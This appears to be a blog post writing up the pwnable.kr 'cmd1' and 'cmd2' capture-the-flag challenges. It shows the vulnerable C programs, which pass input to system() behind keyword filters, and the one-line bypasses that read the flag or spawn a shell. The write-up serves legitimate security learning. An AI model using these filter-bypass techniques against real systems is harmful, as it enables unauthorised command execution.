---
layout: post
title: "cmd challenges in Pwnable.kr"
date: 2019-07-27 +0100
categories: ctf
---
In this post we solve a few easy challenges on pwnable.kr called `cmd1` and `cmd2`


## cmd1 and cmd2       
                           
These two challenges required us to circumvent a cleared `PATH` environment variable.          
                                                    
### cmd1                         
                                     
In the first challenge, the program has a small filter, that doesn't include `/`
                          
```c                                    
#include <stdio.h>                    
#include <string.h>                                      
                                     
int filter(char* cmd){                                              
        int r=0;                   
        r += strstr(cmd, "flag")!=0; 
        r += strstr(cmd, "sh")!=0;  
        r += strstr(cmd, "tmp")!=0;                                                                         
        return r;  
}          
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );                                
        return 0;              
}                              
```                                           
                             
Omitting this filter is rather easy with sh's `*` expansion and a full path to the executeable we wish to utilize.
                                     
`./cmd1 "/bin/cat /home/cmd1/fl*"`
           
        
### cmd2

In the second challenge, the program has a larger filter, and clears all environment variables. 

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```

This makes us unable to use the solution from the first challenge, as it includes `/` for the program name.

However, sh has a built-in, called `command`, see the [bash man page](http://manpages.ubuntu.com/manpages/xenial/man7/bash-builtins.7.html?source=post_page---------------------------), this takes a parameter `-p` which uses a default setting for the `PATH` variable. Now we can execute `./cmd2 "command -p sh"` and pop a shell, from here we can `cat` the flag.

